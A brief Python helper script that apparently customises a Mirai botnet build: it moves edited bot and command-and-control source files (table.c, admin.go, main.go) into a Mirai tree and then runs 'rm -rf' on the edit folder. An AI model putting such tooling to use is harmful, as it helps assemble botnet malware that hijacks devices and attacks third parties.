import subprocess,os,sys,random,time,urllib3,subprocess,base64

def run(cmd):                                                  
     subprocess.call(cmd, shell=True)

run("mv edit/bot/table.c JG/mirai/bot")

run("mv edit/cnc/admin.go JG/mirai/cnc")
run("mv edit/cnc/main.go JG/mirai/cnc")

run("rm -rf edit")
